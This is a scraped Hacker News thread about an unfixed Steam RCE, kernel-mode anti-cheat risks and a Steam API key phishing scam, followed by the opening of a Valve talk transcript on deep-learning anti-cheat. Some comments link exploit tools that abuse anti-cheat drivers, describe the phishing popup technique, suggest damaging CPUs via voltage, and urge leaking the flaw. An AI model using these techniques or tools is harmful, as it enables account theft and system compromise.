[charcircuit](user?id=charcircuit) [on April 10, 2021](item?id=26765099)   | [root](#26762448) | [parent](#26764168) | [next](#26763034) [–]  You can use DMA to read memory in an undetectable way. | | --- | --- | --- | | | |  |  | [walrus01](user?id=walrus01) [on April 10, 2021](item?id=26763034)   | [parent](#26762448) | [prev](#26762988) | [next](#26763209) [–]  It seems that a lot of people forgot about things like sony installing rootkits on peoples' PCs. Now it's accepted for gaming anti cheat software? | | --- | --- | --- | | | |  |  | [rstat1](user?id=rstat1) [on April 10, 2021](item?id=26763364)   | [root](#26762448) | [parent](#26763034) | [next](#26764020) [–]  In my mind there's a huge difference between the 2. The sony rootkit was installed in secret, full of security holes, hard to remove, and made by a vendor that appeared to give 0 shits about said security holes. All of the anti-cheat solutions I've seen that run in kernel mode are none of those things. They make it well known that they're installing, are made by vendors that actively care about the security of their products, and are trivially easy to remove once they're no longer needed. | | --- | --- | --- | | | |  |  | [fuyu](user?id=fuyu) [on April 10, 2021](item?id=26764100)   | [root](#26762448) | [parent](#26763364) | [next](#26763832) [–]  Genshin Impact is a recent game that has included a kernel mode anti-cheat. I would be very surprised if the majority of players know that it exists, or understand what it means to have it run in kernel mode. The Genshin website previously allowed anyone to view the phone number you have linked to your account via the password reset mechanism. Due to common reports of accounts getting stolen (and unable to be recovered), two factor auth has been highly requested, but doesn't seem to be a priority. I'm skeptical that they strongly care about the security of their users. Even if Genshins anti-cheat is completely secure, as kernel anti-cheat becomes more common it's inevitable that we will get an instance that is full of security holes. Unfortunately as long as the user can't play their favorite game without it, they will happily install it. | | --- | --- | --- | | | |  |  | [charcircuit](user?id=charcircuit) [on April 10, 2021](item?id=26765153)   | [root](#26762448) | [parent](#26764100) | [next](#26764629) [–]  Even if the security is bad does it even matter? User mode is enough for malware. "Sure an attacker could mine crypto, DoS people, use me as a proxy, keylog me, use my webcam, steal my saved usernames and passwords, but at least they can't upgrade my graphics drivers", said no one ever. | | --- | --- | --- | | | |  |  | [oxylibrium](user?id=oxylibrium) [on April 24, 2021](item?id=26922658)   | [root](#26762448) | [parent](#26765153) | [next](#26764629) [–]  Oh, there's a lot more "fun" stuff you can do in kernel mode. One comedic example is setting the CPU Vcore offset to +2.2V for fun/revenge. I don't know if it will destroy CPUs permanently, but it would be an interesting experiment. More importantly though, once you're in the kernel, its much easier to hide your presence to all manner of Windows sysadmin tools. | | --- | --- | --- | | | |  |  | [oxylibrium](user?id=oxylibrium) [on April 10, 2021](item?id=26764629)   | [root](#26762448) | [parent](#26764100) | [prev](#26765153) | [next](#26764260) [–]  Genshin Impact's anti-cheat is not completely secure: you can use it to read/write umode memory / read kmode memory with kernel privileges: <https://github.com/ScHaTTeNLiLiE/libmhyprot> Mirror repo after the original author took the repo down, but still exploitable AFAIK. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [on April 10, 2021](item?id=26765421)   | [root](#26762448) | [parent](#26764629) | [next](#26764260) [–]  Explanation of the exploit here: <https://github.com/Luohuayu/evil-mhyprot-cli> Not as bad as capcom.sys: [https://mobile.twitter.com/TheWack0lian/status/7793978407622...](https://mobile.twitter.com/TheWack0lian/status/779397840762245124) The effect is the same though: ring 0 code execution. | | --- | --- | --- | | | |  |  | [invokestatic](user?id=invokestatic) [on April 10, 2021](item?id=26764260)   | [root](#26762448) | [parent](#26764100) | [prev](#26764629) | [next](#26763832) [–]  I’m an anti cheat dev and I think client-side anti cheats make no sense on a typical MMO. Pretty much all cheats for those types of games can be detected server-side. RuneScape is a great example of this. | | --- | --- | --- | | | |  |  | [philistine](user?id=philistine) [on April 10, 2021](item?id=26763832)   | [root](#26762448) | [parent](#26763364) | [prev](#26764100) | [next](#26764580) [–]  Hopefully, Microsoft is going to follow in Apple's footsteps and close the access to the kernel for any and all programs. Yes, we will lose a lot, since Apple right now cannot cover all use cases of kernel access through new APIs, but we will gain so much in security and reliability. I'm of the opinion that easy kernel access for all apps and games is ultimately not putting me in control of my computer. | | --- | --- | --- | | | |  |  | [rstat1](user?id=rstat1) [on April 10, 2021](item?id=26764076)   | [root](#26762448) | [parent](#26763832) | [next](#26764016) [–]  Access to kernel mode on Windows is already pretty restricted as it is. As far as I understand, you either have to run your whole machine in a special "Test Mode" or have a specific kind of (expensive) code signing certificate. But beyond that, I don't see how "more restriction" == "more control for the user" | | --- | --- | --- | | | |  |  | [ladyanita22](user?id=ladyanita22) [on April 10, 2021](item?id=26765230)   | [root](#26762448) | [parent](#26764076) | [next](#26764016) [–]  Are you talking about driver signing? | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on April 10, 2021](item?id=26764016)   | [root](#26762448) | [parent](#26763832) | [prev](#26764076) | [next](#26764580) [–]  They already kind of did, I only install PC games via the Windows store. | | --- | --- | --- | | | |  |  | [oxylibrium](user?id=oxylibrium) [on April 10, 2021](item?id=26764580)   | [root](#26762448) | [parent](#26763364) | [prev](#26763832) | [next](#26764020) [–]  > ...make it well known that they're installing... Many vendors originally hid the fact until they started receiving community backlash about it. For example, Riot with Vanguard originally hid\*[0] that it was running 24/7, and also hid the fact that it blocked drivers, until people noticed and complained about it. Many games, PUBG Lite and Genshin Impact in recent memory, also do not reveal this to the user. [0]: [https://gameriv.com/vanguard-adds-a-system-tray-icon-to-give...](https://gameriv.com/vanguard-adds-a-system-tray-icon-to-give-valorant-players-more-control-over-it/) \*: I'm aware there was a blog post about it, but blog post about it != clear, upfront warning on install about behavior > ...made by vendors that actively care about the security of their products... Here's some fun, all involving anti-cheats: - Using xhunter1.sys (XIGNCODE3) for an LPE: <https://x86.re/blog/xigncode3-xhunter1.sys-lpe/> (still used in some MMOs!) - Using capcom.sys (rootkit shipped with Street Fighter V) to write a rootkit: <https://www.fuzzysecurity.com/tutorials/28.html> - Using mhyprot2.sys (from Genshin Impact) to read/write umode memory / read kmode memory with kernel privileges: <https://github.com/ScHaTTeNLiLiE/libmhyprot> (still exploitable, AFAIK!) - Using BEDaisy.sys (BattlEye - shipped in Rainbow Six: Siege, Fortnite, etc) for handle elevation: <https://back.engineering/21/08/2020/> In addition, you still need to trust the vendor (duh!). Some of them are essentially RATs, like BattlEye - it loads shellcode from the server that runs in BEService as NT/SYSTEM, and they can target code pushes by IP/ingame ID/etc. Reverse engineering the anti-cheat itself is not enough to trust it; it can change its behavior as it sees fit. They can even choose to specifically target you and steal your files, and there's a very high chance you'll never find out about it. > ...and are trivially easy to remove once they're no longer needed. Depends on how you define "trivially easy" - for eg. with Riot Vanguard, it installs/uninstalls separately from Valorant so you need to remember that separately. Some other ones, like xhunter\*.sys install silently and aren't easy to uninstall at all unless you go delete files in System32. Others like EasyAntiCheat/BattlEye (last I used it, been years since I've touched them) need special uninstaller .exes that are included with the game, but are not registered with Windows or don't run automatically when uninstalling the game. | | --- | --- | --- | | | |  |  | [linkfee](user?id=linkfee) [on April 10, 2021](item?id=26764752)   | [root](#26762448) | [parent](#26764580) | [next](#26764020) [–]  disgusting company, disgusting policies. But awesome research! ~nerrix | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on April 10, 2021](item?id=26764020)   | [root](#26762448) | [parent](#26763034) | [prev](#26763364) | [next](#26763209) [–]  Depends, Windows Store and the respective sandbox is a thing. | | --- | --- | --- | | | |  |  | [fpgaminer](user?id=fpgaminer) [on April 10, 2021](item?id=26763209)   | [parent](#26762448) | [prev](#26763034) | [next](#26762842) [–]  This is the way. Many games package in outright spyware that siphon all kinds of data off your machine including browsing history. Kerbal Space Program was infamous for this (they removed the spyware at some point but I haven't checked recently if it was ever added back in). | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [on April 10, 2021](item?id=26765438)   | [root](#26762448) | [parent](#26763209) | [next](#26762842) [–]  > Many games package in outright spyware that siphon all kinds of data off your machine including browsing history. Please post details. Were they literally mining user data? | | --- | --- | --- | | | |  |  | [fpgaminer](user?id=fpgaminer) [on April 12, 2021](item?id=26782871)   | [root](#26762448) | [parent](#26765438) | [next](#26762842) [–]  The spyware is called Red Shell and it got packaged with a bunch of popular games. Yes, it mines user data. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [on April 12, 2021](item?id=26782941)   | [root](#26762448) | [parent](#26782871) | [next](#26762842) [–]  Thanks for the reference. | | --- | --- | --- | | | |  |  | [Guest19023892](user?id=Guest19023892) [on April 10, 2021](item?id=26762842)   | [parent](#26762448) | [prev](#26763209) | [next](#26765345) [–]  This is one of the reasons I like gaming on GeForce NOW. I can use my primary laptop, play any game without having to install anything, instantly alt-tab back to the desktop between rounds without any weird bugs or crashes, etc. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [on April 10, 2021](item?id=26765345)   | [parent](#26762448) | [prev](#26762842) | [next](#26763825) [–]  Game companies literally think they have the right to own your machine. This is the kind of garbage they force gamers to install on their machines: [https://www.theregister.com/2016/09/23/capcom\_street\_fighter...](https://www.theregister.com/2016/09/23/capcom_street_fighter_v/) [https://mobile.twitter.com/TheWack0lian/status/7793978407622...](https://mobile.twitter.com/TheWack0lian/status/779397840762245124) Their software also takes screen shots, walks the file system, scans people's processes... Any similarities to malware may or may not be mere coincidences. They're also known for false positives: banning people for receiving special strings via text message, unknowingly installing mods with hacks bundled in or due to the presence of development tools such as debuggers or even virtual machines. Good luck trying to reverse such a ban, the entire gaming community has already been conditioned to accept any decision as final and to even *defend* this practice. When coupled with DRM, this essentially means your license to play the game has been revoked with no refunds. | | --- | --- | --- | | | |  |  | [sseneca](user?id=sseneca) [on April 10, 2021](item?id=26763825)   | [parent](#26762448) | [prev](#26765345) | [next](#26764024) [–]  > Some game companies (riot games) even install their anti-cheat software so that is loads in the ring 0 space. Why are separate machines required, rather than dual-booting? (i.e. Windows for games, Linux for everything else) | | --- | --- | --- | | | |  |  | [zionic](user?id=zionic) [on April 10, 2021](item?id=26764174)   | [root](#26762448) | [parent](#26763825) | [next](#26765489) [–]  Because Linux and windows bootloaders routinely screw with each other. I am NEVER losing another weekend to that crap again. Dedicated windows gaming PC is the correct way to deal with this. | | --- | --- | --- | | | |  |  | [0xbkt](user?id=0xbkt) [on April 10, 2021](item?id=26765008)   | [root](#26762448) | [parent](#26764174) | [next](#26765682) [–]  With a UEFI-GPT setup two ESPs (one for each OS) and you're good. Now that I have no software bootloaders, which need to know about multiple OSs, I only need to use BIOS' own boot device selector on startup. | | --- | --- | --- | | | |  |  | [andoriyu](user?id=andoriyu) [on April 10, 2021](item?id=26765682)   | [root](#26762448) | [parent](#26764174) | [prev](#26765008) | [next](#26765489) [–]  That's not the case for a long time. I have rEFInd that started life in windows 7 esp with freebsd dual booting, now the same hard-drive booting windows 10 (upgraded from 7, not fresh installation) and nixos, all with the same rEFInd from the same. The correct way to do so, is to have separate hard-drives for different OS. Then there is zero chance of them stepping on each other. | | --- | --- | --- | | | |  |  | [flowless](user?id=flowless) [on April 10, 2021](item?id=26765489)   | [root](#26762448) | [parent](#26763825) | [prev](#26764174) | [next](#26763948) [–]  You can also run virtual machine with real card attached to it via VFIO if your host has IOMMU support. Guess what this means for anti-cheat. | | --- | --- | --- | | | |  |  | [sseneca](user?id=sseneca) [on April 11, 2021](item?id=26766593)   | [root](#26762448) | [parent](#26765489) | [next](#26766388) [–]  As the other user said, BattleEye now bans for this. I used a VFIO set up for a number of years but had to switch because of it. | | --- | --- | --- | | | |  |  | [120391583](user?id=120391583) [on April 10, 2021](item?id=26766388)   | [root](#26762448) | [parent](#26765489) | [prev](#26766593) | [next](#26763948) [–]  Some anti-cheats like BattlEye try to detect if they're running in a VM. | | --- | --- | --- | | | |  |  | [pstrateman](user?id=pstrateman) [on April 10, 2021](item?id=26763948)   | [root](#26762448) | [parent](#26763825) | [prev](#26765489) | [next](#26764024) [–]  Your computer is really a bunch of computers pretending to be a single computer. Most of the components have firmware that can itself be loaded with malware. | | --- | --- | --- | | | |  |  | [sseneca](user?id=sseneca) [on April 10, 2021](item?id=26764148)   | [root](#26762448) | [parent](#26763948) | [next](#26764024) [–]  Ah. So, if a Windows application runs in ring 0, it can put malware in a place such that it can then interact with the Linux install? Is there \_any\_ way to bypass this, apart from separate machines? I didn't know this was possible. | | --- | --- | --- | | | |  |  | [120391583](user?id=120391583) [on April 10, 2021](item?id=26764831)   | [root](#26762448) | [parent](#26764148) | [next](#26764681) [–]  It's a very real and terrifying threat. A standard PC has numerous components with their own firmware that can potentially be flashed. Some of those components may have integrity checking schemes that are supposed to ensure only vendor-signed code can be flashed or executed, but don't rely on those measures actually working as intended (and not being exploitable themselves). Hardware vendors are notoriously bad at this. This is one of the reasons I'm so enthusiastic about the T2 and M1: a hardware root of trust designed by a *competent* vendor. (Yes, there is a flaw in the T2, but it requires physical access to exploit.) In my opinion, those are the only trustworthy desktops or laptops on the market right now. You'll notice AWS (Nitro) and Google (Titan) also have their own proprietary hardware security chips for the same reason. | | --- | --- | --- | | | |  |  | [rincebrain](user?id=rincebrain) [on April 10, 2021](item?id=26764681)   | [root](#26762448) | [parent](#26764148) | [prev](#26764831) | [next](#26764024) [–]  Theoretically - and vice-versa. Depends on what the avenue of exploit you're worried about is. You can disable BIOS flashing from the OS in the BIOS, but that might still be theoretically vulnerable to, say, compromising the Intel ME environment and flashing from there; a rootkit loaded in SMM could hang around until the machine is cold power cycled (and theoretically compromise the bootloader(s) to load itself and then chainload the "real" bootloader every boot); if you want to get really invasive, you could theoretically start flashing various microcontrollers attached to the system (say, a USB flash drive, or your HDD/SSD controller) to do malicious things. These get increasingly unlikely (and unreliable, without knowing and targeting the specific hardware you're using) as your attacker model includes less resources, but not impossible. Intel ME code execution, BIOS and SMM rootkits, malicious USB flash drive firmware and HDD firmware have all been demonstrated (I haven't seen malicious SSD firmware, but there's nothing theoretically stopping it other than the controller doing a lot more on them), and a couple have even been found in the wild. | | --- | --- | --- | | | |  |  | [JUNGLEISMASSIVE](user?id=JUNGLEISMASSIVE) [on April 10, 2021](item?id=26764024)   | [parent](#26762448) | [prev](#26763825) | [next](#26762479) [–]  I hope those separate machines are also on separate network segments without a route in between. | | --- | --- | --- | | | |  |  | [mxscho](user?id=mxscho) [on April 10, 2021](item?id=26762479)   | [prev](#26762448) | [next](#26762655) [–]  According to a tweet that was also retweeted by the user @floesen\_ who was mentioned in the original thread, the initial report 2 years ago was done using HackerOne but has probably not seen any helpful response from Valve [1]. There are also other reports of Valve not reacting to HackerOne reports appropriately [2]. It is currently unclear whether there is a publicly available PoC or any exploitation going on in the wild. [1] <https://twitter.com/AntiCheatPD/status/1380873722966503426> [2] <https://twitter.com/killa/status/1380872852090540032> | | --- | --- | --- | | | |  |  | [pricechild](user?id=pricechild) [on April 10, 2021](item?id=26762682)   | [parent](#26762479) | [next](#26765781) [–]  > There are also other reports of Valve not reacting to HackerOne reports appropriately I'll second that. I discovered and reported a vulnerability with the Steam client's Bluetooth pairing process via hackerone. The issue was confirmed but decided "out of scope" as apparently "within bluetooth range" runs afoul of the bug bounty's "require physical access" exclusion. 8 months later (I haven't exactly kept on top of this) they're still demanding I keep it confidential. I'll follow it up... | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [on April 10, 2021](item?id=26762963)   | [root](#26762479) | [parent](#26762682) | [next](#26763782) [–]  Surely that's a contradiction? Either it's a security problem by their criteria, or it isn't; if it is, then they should pay up and fix it, if it isn't then they have no legitimate reason to care if you put full details on the front page of $MAJOR\_NEWS\_SITE. | | --- | --- | --- | | | |  |  | [ziml77](user?id=ziml77) [on April 10, 2021](item?id=26763782)   | [root](#26762479) | [parent](#26762682) | [prev](#26762963) | [next](#26763067) [–]  How can they demand that you keep it confidential if they've already declared it to be out-of-scope? People need to start releasing these exploits instead of being a slave because they'd no longer get any payouts from HackerOne. Once the exploits are public, I assure you that either Valve will scramble to fix them or people will start looking for safer alternatives. | | --- | --- | --- | | | |  |  | [pricechild](user?id=pricechild) [on April 10, 2021](item?id=26766105)   | [root](#26762479) | [parent](#26763782) | [next](#26763067) [–]  One of the issues is that it is HackerOne making the demand, not Valve. I have been involved with other bounties on that site in that time, related to other companies & products. I suspect if I had "broken their (Hackerone) policy" with this issue in that time, there would have been problems receiving a reward from the other bounty programs relating to different companies... This isn't the only reason I haven't publicised the issue more widely, I've had other things on my plate, but it is a consideration. | | --- | --- | --- | | | |  |  | [veeti](user?id=veeti) [on April 10, 2021](item?id=26763067)   | [root](#26762479) | [parent](#26762682) | [prev](#26763782) | [next](#26765781) [–]  Just release it. Maybe Valve will have to do something once folks start losing their precious CS:GO skins? | | --- | --- | --- | | | |  |  | [mxscho](user?id=mxscho) [on April 10, 2021](item?id=26764657)   | [root](#26762479) | [parent](#26763067) | [next](#26765781) [–]  Doubt that. There is this so-called "Steam web API key scam" which is ongoing for years at this point: Scammers create phishing Steam login pages to grab people's credentials. Just with these credentials, the damage an attacker can do is still limited because of 2FA. However, the biggest flaw is that it is possible to automatically create API keys for the phished accounts that allow 24/7 remote access of these Steam accounts without the user even noticing. With this access, scammers then automatically modify and alter trades at will and at any time in the future, milliseconds before people confirm them using their mobile device (2FA), e.g., by declining the original trade and setting up a new trade with a scammer's bot account that has changed its profile data to the one of the actually intended trading partner. This attack is mostly based on phishing, spoofing and confusion, but it could at least be made much harder by preventing automated API key generation and therefore indefinite access to an account (e.g., by implementing email confirmations or captchas for API key generation). Each day lots of children or laypeople are losing in-game items worth thousands of dollars. I'm admin on a popular CS:GO and gaming Discord server with ~30k members and we see such reports multiple times a week. Valve has no incentive to fix this as long as it's not their money or regulators start applying pressure. | | --- | --- | --- | | | |  |  | [jsnell](user?id=jsnell) [on April 10, 2021](item?id=26765413)   | [root](#26762479) | [parent](#26764657) | [next](#26765781) [–]  Valve has been pretty aggressive about rolling out these kinds of policies compared to the rest of the industry. (E.g. they were wery early with requiring 2FA to be enabled for a period of time before doing sensitive actions like trades, adding warning interstitials on links that leave Steam). I don't think the incentives have changed that much. So, here's what makes me confused about your story: 1. I don't see any kind of activity hooks in IEconService, that would let the attackers know via a callback that. Are you saying that they're polling all the hijacked accounts at a high frequency to detect trades they could intercept? That seems like a highly divergent use case from normal uses of the API, and one that an abuse team would be motivated to prevent. 2. I thought the Steam trade confirmation dialog showed very specific information about just what was being traded for what. I.e. it's not just that you're approving "a trade with foo", it's "a trade with foo (whom you've had as a friend for 20 days), where you give a xyzzy and receive a quux". Are the users just blindly approving trades worth thousands without even verifying? I don't like either of your solutions though. A captcha would be just be minor irritation for the attacker, and anyone who can be phished into logging in can be phished to approve the key generation. It seems that the bigger problem here is that the API keys are unscoped. Once you have that, it's easier to inform the user in the approval flow about just what they're approving, and viable to nag the users into revoking access for apps with dangerous permissions. | | --- | --- | --- | | | |  |  | [throwawaykol](user?id=throwawaykol) [on April 10, 2021](item?id=26766153)   | [root](#26762479) | [parent](#26765413) | [next](#26766312) [–]  > Are the users just blindly approving trades worth thousands without even verifying? People do. Many years ago I started playing an MMOG and the old timers were all discussing some incredibly rare new item. So I said I had one, and someone said he'd give me 100 million credits for it. For comparison, I'd just spent several hours grinding out about 10 credits. So I sent him a formal offer - some random piece of junk for 100 million credits - and he was so excited he clicked OK without reading what he was getting. He was so angry! He spent weeks spewing venom on the forums. Of course, this wasn't real money, but in terms of time spent earning it he suffered a significant loss. | | --- | --- | --- | | | |  |  | [mxscho](user?id=mxscho) [on April 10, 2021](item?id=26766312)   | [root](#26762479) | [parent](#26765413) | [prev](#26766153) | [next](#26765781) [–]  > Valve has been pretty aggressive about rolling out these kinds of policies compared to the rest of the industry. True indeed. > Are you saying that they're polling all the hijacked accounts at a high frequency to detect trades they could intercept? Yes. I have to admit, the "milliseconds before" part was just wrong because I failed when trying to oversimplify for attention. > it's "a trade with foo (whom you've had as a friend for 20 days), where you give a xyzzy and receive a quux". Are the users just blindly approving trades worth thousands without even verifying? Often, the attackers focus on swapping trade offers that are initiated from a 3rd party, e.g., a trusted middleman marketplace site that requests your item (with nothing in return) that you want to offer. 3rd party sites take a lot of blame for "stolen items" because people don't even understand how this scam works. Here, the few seconds are between the 3rd party offering the trade and the compromised user accepting the trade, not between the user accepting the trade in the browser and on his phone. Since the phished user is not aware of the 3rd party site's account in the first place (it is not one of his friends), it is very easy to clone all the observed account details and transform a scam bot account into looking like it is the one from the 3rd party site. Actually, there are characteristics that cannot be spoofed, but an ordinary user, not even aware that he was phished and that someone has control over his account who can do such things, will not notice this. Now, you could argue that preventing 3rd party sites from existing could also solve this issue. However, I see a valid use case in these 3rd party sites. The goal of my suggestion is to counter these attacks with minimal effort without disabling automated trading capabilities completely: > A captcha would be just be minor irritation for the attacker, and anyone who can be phished into logging in can be phished to approve the key generation. I agree that it would only make the attack harder, not impossible, but considering the usual workflow I still see this as an improvement - as a first step. The phishing is usually done by setting up a "legit" website, e.g. for skin trading, skin gambling or even any other non-financial purpose that requires authentication via Steam. This "legit" website then spawns a malicious "Login with Steam" OpenID credentials popup, rendered inside (!) the web page. This means, the website itself draws (depending on your OS and browser) a perfectly fine looking Browser popup window inside the legit page. It basically spoofs the browser UI itself. Laypeople get fooled easily by this, they sometimes do not even question why the window cannot be dragged out of the page, if they even try. These web apps are built in top-tier quality because obviously, the profit potential is huge. There is probably even a framework sold to easily recreate such pages at this point. What I'm trying to say is: Getting the user to login is easy because it's part of the legit workflow. The API key generation - not so much. Basically, everything I'm asking for is to make it hard to automatically transform a normal user account into a bot account used to automate trade offers. I know that there is a valid use case for automated bot accounts and automated trade offers. But the automation of the action to enable such functionality for an account should be prevented at all cost, and it should be explicitly requested from the user, including a warning. Probably you are saying something similar with that statement with which I agree: > the bigger problem here is that the API keys are unscoped TL;DR: I think that preventing automated Steam web API key generation is the best short-term solution considering effort to make the attack a lot harder for the scammers. | | --- | --- | --- | | | |  |  | [charcircuit](user?id=charcircuit) [on April 11, 2021](item?id=26767182)   | [root](#26762479) | [parent](#26766312) | [next](#26765781) [–]  >means, the website itself draws (depending on your OS and browser) a perfectly fine looking Browser popup window inside the legit page The one I am always sent just shows a W10 decorated window. I've reported this same exact fake steam login popup thing to Cloudflare many times, yet the attackers seem to be deploying almost the same exact site time after time. Thankfully, Cloudflare eventually gets around to taking them down, but they aren't doing anything proactive to stop it from happening again. | | --- | --- | --- | | | |  |  | [tgsovlerkhgsel](user?id=tgsovlerkhgsel) [on April 10, 2021](item?id=26765781)   | [parent](#26762479) | [prev](#26762682) | [next](#26762588) [–]  HackerOne also at least strongly discourages publishing your findings if the developers refuse to take action. <https://www.hackerone.com/disclosure-guidelines> states that "After the Report has been closed, Public disclosure may be requested by either the Finder or the Security Team." - so if the report just doesn't get closed, you can't disclose through the platform, and <https://www.hackerone.com/policies/code-of-conduct> says "Disclosing report information without previous authorization is not permitted." To me, that seems that you're not permitted to disclose the issue at all until the report has been closed and either 1) 30 days have passed and the security team hasn't requested an extension, or 2) "180 days have elapsed with the Security Team being unable or unwilling to provide a vulnerability disclosure timeline". Due to this, I refuse to report through HackerOne. | | --- | --- | --- | | | |  |  | [pityJuke](user?id=pityJuke) [on April 10, 2021](item?id=26762588)   | [parent](#26762479) | [prev](#26765781) | [next](#26762655) [–]  floesen has posted a screenshot of the open ticket back in December. [1] [1]: <https://twitter.com/floesen_/status/1337107178096881666> | | --- | --- | --- | | | |  |  | [gsich](user?id=gsich) [on April 10, 2021](item?id=26762655)   | [prev](#26762479) | [next](#26763458) [–]  2 years? Just leak it. At some point "responsible" disclose is not worth it. | | --- | --- | --- | | | |  |  | [anonymousab](user?id=anonymousab) [on April 10, 2021](item?id=26762869)   | [parent](#26762655) | [next](#26765685) [–]  Moreso, at some point it may be more responsible to exert real pressure and a time concern on them to fix it by revealing the flaw. It depends on whether you think there's a reasonable chance that someone may be using that exploit by now. Carrot and stick approaches do not work without a reliable stick. Edit: I suppose it also depends on how much you value going through the exact same process with valve for other bugs in the future. But in a situation like this it seems like little would be lost. | | --- | --- | --- | | | |  |  | [BlueGh0st](user?id=BlueGh0st) [on April 10, 2021](item?id=26765685)   | [parent](#26762655) | [prev](#26762869) | [next](#26763458) [–]  Absolutely! Going public is an important part of responsible disclosure | | --- | --- | --- | | | |  |  | [Aissen](user?id=Aissen) [on April 10, 2021](item?id=26763458)   | [prev](#26762655) | [next](#26764452) [–]  Totally believable. Someone I trust in the RE community told me about similar shenanigans when trying to report issues to Valve. | | --- | --- | --- | | | |  |  | [lgats](user?id=lgats) [on April 10, 2021](item?id=26764452)   | [prev](#26763458) | [next](#26764964) [–]  CVE Assigned <https://cve.report/CVE-2021-30481> | | --- | --- | --- | | | |  |  | [dkarras](user?id=dkarras) [on April 10, 2021](item?id=26764964)   | [prev](#26764452) | [next](#26768728) [–]  It would be a shame if an "anonymous hacker" "hacked" @floesen\_, found their notes about the RCE and released it to public, accidentally of course. | | --- | --- | --- | | | |  |  | [sneak](user?id=sneak) [on April 10, 2021](item?id=26765100)   | [parent](#26764964) | [next](#26768728) [–]  It would probably also be a shame when floesen\_ got sued for an NDA violation and had to spend tens of thousands of dollars in civil court explaining that they got hacked and it's not their fault. | | --- | --- | --- | | | |  |  | [tgsovlerkhgsel](user?id=tgsovlerkhgsel) [on April 10, 2021](item?id=26765832)   | [root](#26764964) | [parent](#26765100) | [next](#26768728) [–]  Someone would have to do the suing though. Who would that be? It could be either Valve, or HackerOne. HackerOne is almost certainly smarter than doing that because this would immediately ruin their reputation as a bug reporting platform (and expose that they're complicit in suppressing disclosure). They're much more likely to just ban the H1 account or issue some limited penalty. Valve could potentially try, but the risk here also seems minimal: They also have a reputation to uphold, are experienced enough to know that suing security researchers paints a really bad picture and would draw attention to their vulnerabilities, and especially if their software is full of holes, this would almost certainly cause many people to disclose information about those. | | --- | --- | --- | | | |  |  | [breakingcups](user?id=breakingcups) [on April 11, 2021](item?id=26768728)   | [prev](#26764964) | [next](#26765642) [–]  At this point, just leak it to Project Zero anonymously and let them wring Valve's hand for you. There's a small chance you might still get the bounty, because you reported it first. And if not, because it's already disclosed by another party, you can cry foul on social media. | | --- | --- | --- | | | |  |  | [zokier](user?id=zokier) [on April 10, 2021](item?id=26765642)   | [prev](#26768728) | [next](#26765960) [–]  Source engine itself is at least 16 years old, and has pretty direct lineage to the original 21 year old Quake engine (Quake (-> Quake II) -> GoldSrc -> Source). I would be more surprised if there weren't lots of RCEs in it. | | --- | --- | --- | | | |  |  | [rasz](user?id=rasz) [on April 10, 2021](item?id=26765960)   | [prev](#26765642) | [next](#26772079) [–]  Imagine you are Valve - why would you fix anything? Your money printer goes Brrr regardless, and legal assures you H1 deal prevent participants from leaking anything. | | --- | --- | --- | | | |  |  | [DanAtC](user?id=DanAtC) [on April 11, 2021](item?id=26772079)   | [prev](#26765960) [–]  Unless you have the clout of Project Zero, "responsible" disclosure is anything but. Full disclosure or no disclosure. | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from mobile.twitter.com_c0885db2_20250115_140055.html ===



=== Content from www.youtube.com_3163b849_20250115_140058.html ===
[00:02] [Music]
[00:06] hi so we have a little bit of business
[00:09] before we get started I'm supposed to
[00:11] ask you to pretty please mute your cell
[00:13] phones so they don't go off and also to
[00:16] make sure to fill out your surveys when
[00:18] you're done or when we're done
[00:20] they're super helpful for GBC to figure
[00:23] out who they should invite back and
[00:24] they're also super useful for me to
[00:26] figure out if you liked the way I
[00:27] presented and you liked what I presented
[00:28] so please take a moment when we're done
[00:30] to do that alright that's that's this
[00:34] stuff out of the way let's get started
[00:35] so my name is John McDonald I'm here
[00:38] from valve and today I wanted to come
[00:40] and talk a little bit about how we've
[00:41] been using deep learning to effectively
[00:44] combat cheating in csgo spoiler alert it
[00:47] works pretty well we're pretty happy
[00:48] with it so that's a bunch of stuff we
[00:52] have a whole hour so we're gonna we're
[00:54] gonna cover a lot of ground I'm gonna
[00:57] spend a little bit of time probably a
[00:59] fair warning probably about 15 minutes
[01:01] kind of talking about the state of csgo
[01:03] with respect to cheating other things
[01:05] that we do in this space and then we'll
[01:08] dive into sort of the pitch that I was
[01:11] making to folks around valve in 2016 for
[01:13] why we should maybe give this a try
[01:15] we'll dive into results and then we'll
[01:18] talk a little bit about how you train
[01:20] and utilize deep networks we'll talk
[01:23] about some ongoing in your term work and
[01:24] then we'll finish up one thing that's
[01:27] probably worth mentioning is that
[01:29] notably absent from this list is deep
[01:32] learning I'm not actually going to try
[01:34] and teach you deep learning in an hour
[01:35] because I don't believe that I can do it
[01:37] but I will point you at the end towards
[01:39] resources so that if when we're done you
[01:41] feel like oh that's something that maybe
[01:43] I should try you know where to get
[01:45] started
[01:46] and good news it's actually pretty
[01:48] straightforward to to learn alright so
[01:51] let's talk a little bit about csgo
[01:53] itself first csgo if you're unfamiliar I
[01:57] think most of you probably are but it is
[01:59] a succession of counter-strike it is a
[02:02] competitive multiplayer game it's a
[02:05] fast-paced action we have sort of
[02:08] bullets that are extremely extremely
[02:10] Lethal and when you're dead for around
[02:12] you're out
[02:13] combat engagements in csgo are very very
[02:15] short the average engagement time can be
[02:18] like 1 to 2 seconds and all this sort of
[02:20] matters because it impacts our cheating
[02:22] problem csgo has a 12 point 4 million
[02:25] monthly uniques and 3 million uniques
[02:28] check back in every day so we're we're
[02:31] pretty happy that our player base is so
[02:33] rabid finally it's the 10th title that
[02:37] shipped on Source engine and we'll see
[02:38] how this plays into our cheating problem
[02:39] a little bit later as well one of our
[02:42] most popular modes for csgo is the
[02:44] competitive mode it's a 5 B 5 game mode
[02:46] first to 16 wins and each round is about
[02:49] 2 minutes and 57 seconds when you sign
[02:52] in for matchmaking we we ask you to
